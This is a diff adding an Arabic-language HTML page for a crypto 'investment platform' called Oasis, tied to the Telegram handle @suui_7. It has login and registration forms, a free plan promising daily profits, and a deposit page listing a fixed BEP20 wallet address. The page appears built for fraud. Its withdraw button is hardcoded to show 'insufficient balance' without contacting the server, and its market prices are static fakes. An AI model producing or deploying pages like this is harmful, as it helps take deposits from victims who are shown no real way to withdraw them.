@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oasis | المنصة الاحترافية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --primary: #3a7bd5; --secondary: #00d2ff; --dark: #0f172a; --card-bg: rgba(30, 41, 59, 0.7); --text: #f8fafc; --success: #4ade80; --danger: #ef4444; --telegram: #0088cc; }
+        body { font-family: 'Cairo', sans-serif; background-color: var(--dark); color: var(--text); margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        #notification-box { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 20000; width: 90%; max-width: 350px; }
+        .notify { padding: 15px; border-radius: 12px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); backdrop-filter: blur(10px); animation: slideDown 0.4s forwards; border-right: 5px solid var(--secondary); }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        .main-content { flex: 1; padding: 20px; overflow-y: auto; padding-bottom: 100px; display: none; }
+        .page { display: none; } .page.active { display: block; animation: fadeIn 0.4s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .card { background: var(--card-bg); padding: 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 15px; backdrop-filter: blur(15px); }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); background: rgba(15, 23, 42, 0.8); color: white; outline: none; box-sizing: border-box; }
+        .btn { background: linear-gradient(90deg, var(--primary), var(--secondary)); color: white; border: none; padding: 14px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: rgba(17, 24, 39, 0.8); display: none; justify-content: space-around; height: 80px; backdrop-filter: blur(20px); z-index: 999; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #94a3b8; flex: 1; cursor: pointer; }
+        .nav-item.active { color: var(--secondary); }
+        .auth-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark); display: flex; align-items: center; justify-content: center; z-index: 10000; flex-direction: column; }
+        .auth-card { background: #1e293b; width: 90%; max-width: 320px; padding: 40px 25px; border-radius: 25px; text-align: center; }
+        .ticker-wrap { background: rgba(0,0,0,0.5); padding: 8px; overflow: hidden; white-space: nowrap; margin: 10px 0; display: none; }
+        .ticker-move { display: inline-block; animation: ticker 25s linear infinite; }
+        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        .floating-support { position: fixed; bottom: 90px; left: 20px; width: 50px; height: 50px; background: var(--telegram); border-radius: 50%; display: none; align-items: center; justify-content: center; color: white; text-decoration: none; font-size: 1.5rem; z-index: 1000; }
+    </style>
+</head>
+<body>
+    <div id="notification-box"></div>
+    <a href="https://t.me/suui_7" id="tg-btn" class="floating-support" target="_blank"><i class="fab fa-telegram-plane"></i></a>
+
+    <div id="auth-screen" class="auth-overlay">
+        <div class="auth-card">
+            <h1 style="color:var(--secondary); font-size: 3rem; margin:0;">Oasis</h1>
+            <p style="color:#94a3b8; font-size: 0.8rem; margin-bottom:25px;">استثمار آمن وموثوق @suui_7</p>
+            <div id="login-form">
+                <input type="email" id="l-email" placeholder="البريد الإلكتروني">
+                <input type="password" id="l-pass" placeholder="كلمة المرور">
+                <button class="btn" onclick="handleLogin()">دخول</button>
+                <p style="font-size: 0.8rem; margin-top:20px;">ليس لديك حساب؟ <a href="#" onclick="toggleAuth(true)" style="color:var(--secondary)">سجل الآن</a></p>
+            </div>
+            <div id="register-form" style="display:none">
+                <input type="text" id="r-user" placeholder="الاسم الكامل">
+                <input type="email" id="r-email" placeholder="البريد الإلكتروني">
+                <input type="password" id="r-pass" placeholder="كلمة المرور">
+                <button class="btn" onclick="handleRegister()">إنشاء حساب</button>
+                <p style="font-size: 0.8rem; margin-top:20px;">لديك حساب؟ <a href="#" onclick="toggleAuth(false)" style="color:var(--secondary)">دخول</a></p>
+            </div>
+        </div>
+        <div style="position:absolute; bottom:20px; color:#64748b; font-size: 0.7rem;">جميع الحقوق محفوظة @suui_7</div>
+    </div>
+
+    <div class="main-content" id="main-ui">
+        <div id="home" class="page active">
+            <div class="card">
+                <h3>سوق التداول مباشر</h3>
+                <div class="ticker-wrap" id="ticker" style="display:block"><div class="ticker-move"><span style="color:var(--success)">BTC: $64,200 ▲</span> | <span style="color:var(--danger)">ETH: $3,100 ▼</span></div></div>
+                <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3ABTCUSDT&theme=dark" style="width:100%; height:200px; border:none; border-radius:10px;"></iframe>
+            </div>
+        </div>
+
+        <div id="invest-page" class="page">
+            <h1>خطط الاستثمار</h1>
+            <div class="card" style="border: 1px solid var(--success)">
+                <h3>خطة مجانية</h3>
+                <p>ربح 0.21$ يومياً | 10 أيام</p>
+                <button class="btn" style="background:var(--success); color:#000" onclick="sendNotify('success', 'سيتم التفعيل يدوياً من الأدمن')">تفعيل مجاني</button>
+            </div>
+        </div>
+
+        <div id="profile" class="page">
+            <div class="card" style="text-align:center; border:1px solid var(--secondary)">
+                <p>إجمالي الرصيد</p>
+                <h2 id="balance-val" style="font-size: 2.5rem; color:var(--secondary)">$0.00</h2>
+                <div style="display:flex; gap:10px; margin-top:15px">
+                    <button class="btn" onclick="showPage('dep-p')">إيداع</button>
+                    <button class="btn" style="background:#334155" onclick="sendNotify('danger', 'الرصيد غير كافٍ')">سحب</button>
+                </div>
+            </div>
+            <div class="card">
+                <label>محفظة BEP20</label>
+                <input type="text" id="w-addr" placeholder="أدخل محفظتك هنا">
+                <button class="btn" onclick="updateW()">حفظ المحفظة</button>
+            </div>
+        </div>
+
+        <div id="dep-p" class="page">
+            <h1 onclick="showPage('profile')">← إيداع</h1>
+            <div class="card">
+                <p style="font-size: 0.8rem">حول لعنوان BEP20:</p>
+                <div class="card" id="c-addr" style="font-size:0.7rem; word-break:break-all">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</div>
+                <button class="btn" onclick="copyT()">نسخ العنوان</button>
+                <input type="text" id="tx-id" placeholder="رقم المعاملة TXID">
+                <button class="btn" onclick="doDep()">تأكيد الإيداع</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-nav" id="nav-bar">
+        <div class="nav-item active" onclick="navTo('home', this)"><i class="fas fa-chart-line"></i><span>السوق</span></div>
+        <div class="nav-item" onclick="navTo('invest-page', this)"><i class="fas fa-bolt"></i><span>استثمار</span></div>
+        <div class="nav-item" onclick="navTo('profile', this)"><i class="fas fa-wallet"></i><span>محفظتي</span></div>
+    </div>
+
+    <script>
+        async function handleLogin() {
+            const email = document.getElementById('l-email').value;
+            const password = document.getElementById('l-pass').value;
+            const res = await fetch('/api/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email, password}) });
+            const data = await res.json();
+            if(data.success) {
+                document.getElementById('auth-screen').style.display = 'none';
+                document.getElementById('main-ui').style.display = 'block';
+                document.getElementById('nav-bar').style.display = 'flex';
+                document.getElementById('tg-btn').style.display = 'flex';
+                document.getElementById('balance-val').innerText = '$' + data.balance.toFixed(2);
+                document.getElementById('w-addr').value = data.wallet;
+            } else { sendNotify('danger', 'خطأ في البيانات'); }
+        }
+
+        async function handleRegister() {
+            const username = document.getElementById('r-user').value;
+            const email = document.getElementById('r-email').value;
+            const password = document.getElementById('r-pass').value;
+            const res = await fetch('/api/register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username, email, password}) });
+            const data = await res.json();
+            if(data.success) { sendNotify('success', 'تم! سجل دخولك'); toggleAuth(false); } else { sendNotify('danger', data.message); }
+        }
+
+        async function doDep() {
+            const txid = document.getElementById('tx-id').value;
+            if(!txid) return;
+            const res = await fetch('/api/deposit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({txid}) });
+            if((await res.json()).success) { sendNotify('success', 'تم الإرسال للمراجعة'); showPage('profile'); }
+        }
+
+        async function updateW() {
+            const wallet = document.getElementById('w-addr').value;
+            await fetch('/api/update_wallet', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({wallet}) });
+            sendNotify('success', 'تم التحديث');
+        }
+
+        function toggleAuth(isR) { document.getElementById('login-form').style.display = isR?'none':'block'; document.getElementById('register-form').style.display = isR?'block':'none'; }
+        function sendNotify(t, m) { const b = document.getElementById('notification-box'); const n = document.createElement('div'); n.className = 'notify'; n.innerHTML = m; b.appendChild(n); setTimeout(()=>n.remove(), 3000); }
+        function navTo(id, el) { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active')); el.classList.add('active'); }
+        function showPage(id) { document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+        function copyT() { navigator.clipboard.writeText("0x71C7656EC7ab88b098defB751B7401B5f6d8976F"); sendNotify('success', 'تم النسخ'); }
+    </script>
+</body>
+</html>
